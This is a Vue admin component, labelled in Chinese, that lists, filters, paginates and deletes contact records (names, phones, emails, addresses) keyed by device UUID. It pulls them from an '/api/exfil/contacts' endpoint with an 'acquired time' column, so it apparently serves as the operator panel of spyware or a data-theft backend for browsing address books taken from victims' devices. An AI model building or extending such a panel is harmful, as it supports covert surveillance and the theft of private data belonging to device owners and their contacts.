<template>
  <div class="contacts">
    <el-card>
      <div class="search-bar">
        <el-input v-model="filters.device_uuid" placeholder="设备UUID" style="width: 250px;" />
        <el-input v-model="filters.name" placeholder="姓名" style="width: 150px;" />
        <el-input v-model="filters.phone" placeholder="电话" style="width: 150px;" />
        <el-button type="primary" @click="loadContacts">查询</el-button>
        <el-button @click="resetFilters">重置</el-button>
      </div>
      
      <el-table :data="contactsData" border v-loading="loading">
        <el-table-column prop="id" label="ID" width="80" />
        <el-table-column prop="device_uuid" label="设备UUID" width="250" />
        <el-table-column prop="name" label="姓名" />
        <el-table-column prop="phone" label="电话" />
        <el-table-column prop="email" label="邮箱" />
        <el-table-column prop="address" label="地址" />
        <el-table-column prop="created_at" label="获取时间" width="180" />
        <el-table-column label="操作" width="100">
          <template #default="scope">
            <el-button size="small" type="danger" @click="deleteItem(scope.row.id)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>
      
      <el-pagination
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>
  </div>
</template>

<script setup>
import { ref, reactive } from 'vue'
import axios from '../utils/axios'

const contactsData = ref([])
const loading = ref(false)

const filters = reactive({
  device_uuid: '',
  name: '',
  phone: ''
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

async function loadContacts() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', (pagination.page - 1) * pagination.size)
    params.append('limit', pagination.size)
    if (filters.device_uuid) params.append('device_uuid', filters.device_uuid)
    if (filters.name) params.append('name', filters.name)
    if (filters.phone) params.append('phone', filters.phone)
    
    const response = await axios.get(`/api/exfil/contacts?${params}`)
    contactsData.value = response.data
  } catch (error) {
    console.error('加载数据失败:', error)
  } finally {
    loading.value = false
  }
}

async function deleteItem(id) {
  if (!confirm('确定要删除这条记录吗？')) return
  try {
    await axios.delete(`/api/exfil/${id}`)
    loadContacts()
  } catch (error) {
    console.error('删除失败:', error)
  }
}

function resetFilters() {
  filters.device_uuid = ''
  filters.name = ''
  filters.phone = ''
  loadContacts()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadContacts()
}

function handleCurrentChange(page) {
  pagination.page = page
  loadContacts()
}

loadContacts()
</script>

<style scoped>
.search-bar {
  display: flex;
  gap: 10px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}
</style>
